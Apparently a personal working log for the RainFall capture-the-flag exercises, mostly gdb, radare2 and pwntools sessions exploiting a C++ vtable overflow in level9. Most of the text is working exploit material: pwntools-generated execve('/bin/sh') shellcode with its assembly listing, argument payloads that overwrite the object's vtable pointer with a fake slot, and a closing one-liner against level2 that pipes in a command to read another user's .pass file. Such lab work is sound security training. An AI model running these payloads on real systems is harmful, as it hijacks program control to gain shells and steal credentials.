# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
# deterministic offset discovery
pwn cyclic 200
pwn cyclic -l 0x61616174

rlwrap ltrace ./level8

heap

malloc-chunk -s 0x804a5a8
hi -v 0x804a5a8

track-heap enable

vis-heap-chunks

info variables ^[^_@]*$
info variables ^[A-Za-z][A-Za-z0-9]*$
info variables ^[A-Za-z][A-Za-z0-9_ ]*$

mt i sec .rodata
xa 0x804a000 8
#pwndbg> i sym 0x804a01c
#typeinfo for N + 4 in section .rodata
x/3bx 0x804a01c+4

#Print vtbl functions of any class in GDB
#https://stackoverflow.com/questions/37213562/
set language c++
ptype std::type_info
set $vt = (void **)&'vtable for N'
set $ti = (const std::type_info *)$vt[1]
p *$ti
x/a (const std::type_info *)$vt[1]
x ((const std::type_info *)$vt[1])->__name
ptype *$ti
ptype *$ti


set $v = (N*)malloc(sizeof(void*))


set print array on
set print asm-demangle on
set print array-indexes on

set $ac = *(int *)($fp + 8)
set $av = *(char ***)($fp + 12)
ptype *$av @ ($ac + 1)

p *$av @ ($ac + 1)

python
n = int(gdb.parse_and_eval("$ac")) + 1
p = gdb.parse_and_eval("$av")
t = gdb.lookup_type("char").pointer().array(n - 1)
v = p.cast(t.pointer()).dereference()
gdb.set_convenience_variable("av", v)
end

set $ac = *(int *)($fp + 8)
py n = int(gdb.parse_and_eval("$ac")) + 1; \
  gdb.execute("set $av = (char *(*)[%d])(*(char ***)($fp+12))" % n)
```


```bash
shopt -s cmdhist lithist
HISTTIMEFORMAT='%F %T '


entry=$'for x in one two; do\n    printf "%s\\n" "$x"\ndone'
history -s "$entry"

fc -ln -1

append_bash_history() {
    local rc=$?
    history -a
    return "$rc"
}
PROMPT_COMMAND='append_bash_history'




```


```python
import os;
os.environ['PWNLIB_LOG_LEVEL'] = 'error'
from pwn import asm, p32, shellcraft;
fd = os.open("output.bin", os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
os.write(fd, asm(shellcraft.i386.linux.sh()))
os.close(fd)
quit()
```


```python
import os;
os.environ['PWNLIB_LOG_LEVEL'] = 'error'
from pwn import *; write("output.bin", asm(shellcraft.i386.linux.sh()))
```

```bash
set print array on
set print asm-demangle on
set print array-indexes on

!gcc -m32 -x c -g3 -O0 \
  -fno-eliminate-unused-debug-types \-c -o /tmp/sym.o \
  - <<< 'typedef struct N { int (**_vptr_N)(void); char str[100]; int nbr; } N;'

add-symbol-file /tmp/sym.o 0x70000000

set $five = *(N **)($sp + 0x14)
set $six = *(N **)($sp + 0x10)

set $ac = *(int *)($fp + 8)
py n = int(gdb.parse_and_eval("$ac")) + 1; \
  gdb.execute("set $av = (char *(*)[%d])(*(char ***)($fp+12))" % n)
p *$av

(gdb) x/a $six
0x804a078:	0x8048848 <vtable for N+8>
(gdb) x/a $five
0x804a008:	0x8048848 <vtable for N+8>
(gdb) x/a (void *)$five + 4
0x804a00c:	0x41414141

# disabling core dump for suid/sgid
sysctl -w fs.suid_dumpable=2

install -d -o root -g root -m 0700 /var/lib/suid-coredumps
sysctl -w fs.suid_dumpable=2
sysctl -w 'kernel.core_pattern=/var/lib/suid-coredumps/core.%P.%t.%u.%s'

set args "$(python2.7 -c 'import struct,os; os.write(1, \
  struct.pack("<I", 0xbffff950) + \
  "_"*104 + \
  struct.pack("<I", 0x804a00c))')" "$(cat output.bin)"

set args $(python2.7 -c 'import struct,os; os.write(1, \
  struct.pack("<I", 0xbffff950) + \
  "_"*104 + \
  struct.pack("<I", 0x804a00c))') $(python2.7 \
-c 'import os; from pwn import asm, shellcraft; os.write(1, asm(shellcraft.i386.linux.sh()))')

set args $(python2.7 -c 'import struct,os; os.write(1, \
  struct.pack("<I", 0xbffff978) + \
  "_"*104 + \
  struct.pack("<I", 0x804a00c))') $(python2.7 \
-c 'import os; from pwn import asm, p32, shellcraft; os.write(1, asm(shellcraft.i386.linux.sh()))')

./level9




(gdb) p *$five
$12 = {
_vptr_N = 0x8048848,
str =     "AAAA", '\000' <repeats 95 times>,
nbr = 5
}

(gdb) x/s (*$av)[1]
0xbffff973:	 "AAAABBBBCCCCDDDD"
(gdb) x/s (*$av)[2]
0xbffff978:	 "0XFICE"

set args $(python2.7 -c 'import struct,os; os.write(1, \
  struct.pack("<I", 0xbffff978) + \
  "_"*104 + struct.pack("<I", 0x804ebb4))') $(python2.7 -c \
  'import os; from pwn import asm, p32, shellcraft; os.write(1, \
  asm(shellcraft.i386.linux.sh()) + " "')

x/a (*(void**)($sp+0x14))+4

(gdb) x/a (*(void**)($sp+0x14))+4
0x804a00c:      0x804ebb8

echo -n "$(PWNLIB_LOG_LEVEL=error python2.7 -c \
  'import os;from pwn import asm, p32, shellcraft; os.write(1, \
  p32(0x804a010) + \
  asm(shellcraft.i386.linux.sh()).ljust(104, b"\x90") + \
  p32(0x804a00c) )')" > /tmp/shell.bin

set args $(python2.7 -c 'import struct,os; os.write(1, \
  struct.pack("<I", 0xbffff978) + \
  "_"*104 + \
  struct.pack("<I", 0x804ebb4))') $(python2.7 \
  -c 'import os; from pwn import asm, p32, shellcraft; os.write(1, asm(shellcraft.i386.linux.sh()))')
p *$av

set $ac = *(int *)($fp + 8)
py n = int(gdb.parse_and_eval("$ac")) + 1; \
gdb.execute("set $av = (char *(*)[%d])(*(char ***)($fp+12))" % n)
p *$av

set $ac = *(int *)($fp + 8)
py n = int(gdb.parse_and_eval("$ac")) + 1; \
gdb.execute("set $av = (char *(*)[3])(*(char ***)($fp+12))" % n)
p *$av

p $ac
p *$av

```

```text
pwndbg> pipe mt pr msymbols | c++filt

Object file /home/abelov/git/c/42london/RainFall/level9/level9:

[ 0] T 0x8048464 _init section .init  level9.cpp
[ 1] S 0x80484b0 __cxa_atexit section .plt
[ 2] T 0x80484b0 __cxa_atexit@plt section .plt
[ 3] S 0x80484c0 __gmon_start__ section .plt
[ 4] T 0x80484c0 __gmon_start__@plt section .plt
[ 5] S 0x80484d0 std::ios_base::Init::Init() section .plt  std::ios_base::Init::Init()
[ 6] T 0x80484d0 std::ios_base::Init::Init()@plt section .plt  std::ios_base::Init::Init()@plt
[ 7] S 0x80484e0 __libc_start_main section .plt
[ 8] T 0x80484e0 __libc_start_main@plt section .plt
[ 9] S 0x80484f0 _exit section .plt
[10] T 0x80484f0 _exit@plt section .plt
[11] S 0x8048500 std::ios_base::Init::~Init() section .plt  std::ios_base::Init::~Init()
[12] T 0x8048500 std::ios_base::Init::~Init()@plt section .plt  std::ios_base::Init::~Init()@plt
[13] S 0x8048510 memcpy section .plt
[14] T 0x8048510 memcpy@plt section .plt
[15] S 0x8048520 strlen section .plt
[16] T 0x8048520 strlen@plt section .plt
[17] S 0x8048530 operator new(unsigned int) section .plt  operator new(unsigned int)
[18] T 0x8048530 operator new(unsigned int)@plt section .plt  operator new(unsigned int)@plt
[19] T 0x8048540 _start section .text  level9.cpp
[20] t 0x8048570 __do_global_dtors_aux section .text  crtstuff.c
[21] t 0x80485d0 frame_dummy section .text  crtstuff.c
[22] T 0x80485f4 main section .text  level9.cpp
[23] t 0x804869a __static_initialization_and_destruction_0(int, int) section .text  __static_initialization_and_destruction_0(int, int)  level9.cpp
[24] t 0x80486da _GLOBAL__sub_I_main section .text  level9.cpp
[25] T 0x80486f6 N::N(int) section .text  N::N(int)  level9.cpp
[26] T 0x80486f6 N::N(int) section .text  N::N(int)  level9.cpp
[27] T 0x804870e N::setAnnotation(char*) section .text  N::setAnnotation(char*)  level9.cpp
[28] T 0x804873a N::operator+(N&) section .text  N::operator+(N&)  level9.cpp
[29] T 0x804874e N::operator-(N&) section .text  N::operator-(N&)  level9.cpp
[30] T 0x8048770 __libc_csu_init section .text  level9.cpp
[31] T 0x80487e0 __libc_csu_fini section .text  level9.cpp
[32] T 0x80487e2 __i686.get_pc_thunk.bx section .text  level9.cpp
[33] t 0x80487f0 __do_global_ctors_aux section .text  crtstuff.c
[34] T 0x804881c _fini section .fini  level9.cpp
[35] D 0x8048838 _fp_hw section .rodata  level9.cpp
[36] D 0x804883c _IO_stdin_used section .rodata  level9.cpp
[37] D 0x8048840 vtable for N section .rodata  vtable for N  level9.cpp
[38] D 0x8048850 typeinfo name for N section .rodata  typeinfo name for N  level9.cpp
[39] D 0x8048854 typeinfo for N section .rodata  typeinfo for N  level9.cpp
[40] d 0x8048a44 __FRAME_END__ section .eh_frame  crtstuff.c
[41] d 0x8049a48 __init_array_start section .init_array  level9.cpp
[42] d 0x8049a4c __CTOR_LIST__ section .ctors  crtstuff.c
[43] d 0x8049a4c __init_array_end section .init_array  level9.cpp
[44] d 0x8049a50 __CTOR_END__ section .ctors  crtstuff.c
[45] d 0x8049a54 __DTOR_LIST__ section .dtors  crtstuff.c
[46] D 0x8049a58 __DTOR_END__ section .dtors  level9.cpp
[47] d 0x8049a5c __JCR_END__ section .jcr  crtstuff.c
[48] d 0x8049a5c __JCR_LIST__ section .jcr  crtstuff.c
[49] d 0x8049a60 _DYNAMIC section .dynamic  level9.cpp
[50] d 0x8049b44 _GLOBAL_OFFSET_TABLE_ section .got.plt  level9.cpp
[51] ? 0x8049b50 __cxa_atexit@got.plt section .got.plt
[52] ? 0x8049b54 __gmon_start__@got.plt section .got.plt
[53] ? 0x8049b58 std::ios_base::Init::Init()@got.plt section .got.plt  std::ios_base::Init::Init()@got.plt
[54] ? 0x8049b5c __libc_start_main@got.plt section .got.plt
[55] ? 0x8049b60 _exit@got.plt section .got.plt
[56] ? 0x8049b64 std::ios_base::Init::~Init()@got.plt section .got.plt  std::ios_base::Init::~Init()@got.plt
[57] ? 0x8049b68 memcpy@got.plt section .got.plt  memcpy@got[plt]
[58] ? 0x8049b6c strlen@got.plt section .got.plt  strlen@got[plt]
[59] ? 0x8049b70 operator new(unsigned int)@got.plt section .got.plt  operator new(unsigned int)@got.plt
[60] D 0x8049b74 __data_start section .data  level9.cpp
[61] D 0x8049b74 data_start section .data  level9.cpp
[62] D 0x8049b78 __dso_handle section .data  level9.cpp
[63] A 0x8049b7c __bss_start section .interp  level9.cpp
[64] A 0x8049b7c _edata section .interp  level9.cpp
[65] B 0x8049b80 vtable for __cxxabiv1::__class_type_info section .bss  vtable for __cxxabiv1::__class_type_info
[66] B 0x8049b80 vtable for __cxxabiv1::__class_type_info@@CXXABI_1.3 section .bss  vtable for __cxxabiv1::__class_type_info@@CXXABI_1.3  level9.cpp
[67] b 0x8049bac completed.6159 section .bss  completed  crtstuff.c
[68] b 0x8049bb0 dtor_idx.6161 section .bss  dtor_idx  crtstuff.c
[69] b 0x8049bb4 std::__ioinit section .bss  std::__ioinit  level9.cpp
[70] A 0x8049bb8 _end section .interp  level9.cpp

```

```text

r2pipe aaaa


r2pipe afvb- argv
r2pipe afvb- envp

r2pipe afvb 8 argc int
r2pipe afvb 12 argv 'char **'
r2pipe afvb 16 envp 'char **'

r2pipe afvn n1 var_14h
r2pipe afvn n2 var_10h
r2pipe e r2ghidra.vars=true
r2pipe pdg

r2pipe pdf @ sym.main; pdg @ sym.main; afv=


r2pipe e r2ghidra.maximplref=1

r2pipe aaa 2>/dev/null; s sym.main; 'afs int main(int ac, char **argv,char **envp);'
r2pipe afv-var_bp_4h; afv- var_4h
r2pipe '"td struct N { void *vptr; char annotation[100]; int32_t value; }"'
r2pipe s method.constructor.N.N_int_; 'afs void N_ctor(struct N *self, int value)'; pdg
r2pipe s main; pdg

!cat >/tmp/struct_n.h <<'EOF'
struct N {
    void *vptr;
    char annotation[100];
    int32_t value;
};
EOF
r2pipe to /tmp/struct_n.h; tsc N
r2pipe  'afs void N_ctor(struct N *self, int value)'; pdg

r2pipe afvn x var_1ch; afvn y var_18h; afvn xref var_14h; afvn yref var_10h;
r2pipe afvs- ; afvs 0 OUT_ARG1 (void*); afvs 4 OUT_ARG2 (void*); afva; pdf; afvs
```

```text
config decompiler

set decompiler-autosync-vars on
set decompiler-autosync-syms on
set nearpc-backwards-lines 0


set args $(perl -e 'print pack("N25", (0xbebafeca) x 25)')

```


```text
pwndbg> ptype std::type_info
type = class std::type_info {
  protected:
    const char *__name;
  public:
    ~type_info();
  ...
}

pwndbg> print &'typeinfo for N'
$1 = (<data variable, no debug info> *) 0x8048854 <typeinfo for N>
pwndbg> print &'vtable for N'
$2 = (<data variable, no debug info> *) 0x8048840 <vtable for N>
```

```text
radare2
aaaa
s sym.main
afs int main(int ac, char **argv,char **envp)

afvb- argv
afvb- envp

afvb 8 argc int
afvb 12 argv 'char **'
afvb 16 envp 'char **'

pdg

```


```bash
sed -n '93,100{=;p;}' .gdbinit | sed 'N;s/\n/\t/'

cat -n .gdbinit | sed '93,100!d'

p sizeof(N)
```


```bash
0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
0x08048690 <+156>:	mov    DWORD PTR [esp],eax
=> 0x08048693 <+159>:	call   edx
0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
0x08048698 <+164>:	leave
0x08048699 <+165>:	ret
End of assembler dump.
pwndbg> x/a $edx
0x804873a <N::operator+(N&)>:	0x8be58955
pwndbg> tele -fi
0b:002c│+004 0xffffc6cc —▸ 0xf7b53519 (__libc_start_call_main+121) ◂— add esp, 0x10
0a:0028│ ebp 0xffffc6c8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
09:0024│-004 0xffffc6c4 —▸ 0xf7d5c000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
08:0020│-008 0xffffc6c0 —▸ 0xf7eeaa40 ◂— endbr32
07:001c│-00c 0xffffc6bc —▸ 0x804ebb0 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
06:0018│-010 0xffffc6b8 —▸ 0x804ec20 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
05:0014│-014 0xffffc6b4 —▸ 0x804ebb0 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
04:0010│-018 0xffffc6b0 —▸ 0x804ec20 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
03:000c│-01c 0xffffc6ac ◂— 1
02:0008│-020 0xffffc6a8 —▸ 0xf7fbf900 —▸ 0xf7b4ccc6 ◂— 'GLIBC_PRIVATE'
01:0004│-024 0xffffc6a4 —▸ 0x804ebb0 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
00:0000│ esp 0xffffc6a0 —▸ 0x804ec20 —▸ 0x8048848 (vtable for N+8) —▸ 0x804873a (N::operator+(N&)) ◂— push ebp
pwndbg> xa 0x8048838 9
0x8048838 <_fp_hw>:	0x3
0x804883c <_IO_stdin_used>:	0x20001
0x8048840 <vtable for N>:	0x0
0x8048844 <vtable for N+4>:	0x8048854 <typeinfo for N>
0x8048848 <vtable for N+8>:	0x804873a <N::operator+(N&)>
0x804884c <vtable for N+12>:	0x804874e <N::operator-(N&)>
0x8048850 <typeinfo name for N>:	0x4e31
0x8048854 <typeinfo for N>:	0x8049b88 <vtable for __cxxabiv1::__class_type_info@@CXXABI_1.3+8>
0x8048858 <typeinfo for N+4>:	0x8048850 <typeinfo name for N>
pwndbg> mt i sections .rodata
Exec file: `/home/abelov/git/c/42london/RainFall/level9/level9', file type elf32-i386.
 [14]     0x8048838->0x804885c at 0x00000838: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS

```

```python
import os;
from pwn import asm, p32, shellcraft;
os.write(1, asm(shellcraft.i386.linux.sh(), arch = 'i386', os = 'linux').ljust(104, b"\x90"))
```

```pycon
>>> import os; from pwn import asm, p32, shellcraft; os.write(1, asm(shellcraft.i386.linux.sh()).ljust(104, b"\x90"))
cpp -C -nostdinc -undef -P -I/home/abelov/src/pwndbg/.venv/lib/python3.10/site-packages/pwnlib/data/includes
Assembling
.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
.p2align 0
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push 11 /* 0xb */
    pop eax
    int 0x80

/usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-cme1tixo/step2 /tmp/pwn-asm-cme1tixo/step1
/usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-cme1tixo/step3 /tmp/pwn-asm-cme1tixo/step4
```

```bash
PWNLIB_LOG_LEVEL=error python2.7 -c \
'import os
from pwn import asm, p32, shellcraft
os.write(1,
    p32(0x804a010) +
    asm(shellcraft.i386.linux.sh()).ljust(104, b"\x90") +
    p32(0x804a00c)
)' > /tmp/shell.bin
```


```text
annotation + 0x00: 0x0804a010  fake vtable slot
annotation + 0x04: shellcode
...
annotation + 0x6c: 0x0804a00c  replacement vptr
```

```bash
env -i \
    EGG="$(cat output.bin)" \
    ./level9 "$(cat /tmp/overflow.bin)"
```


```bash
python -c 'import os; from pwn import asm, p32, shellcraft; \
  os.write(1, asm(shellcraft.i386.linux.sh()).ljust(80, b"\x90") \
    + p32(0x080484cf) + b"\n")'; echo -e "id\ncat /home/user/level3/.pass" ) | ./level2
```
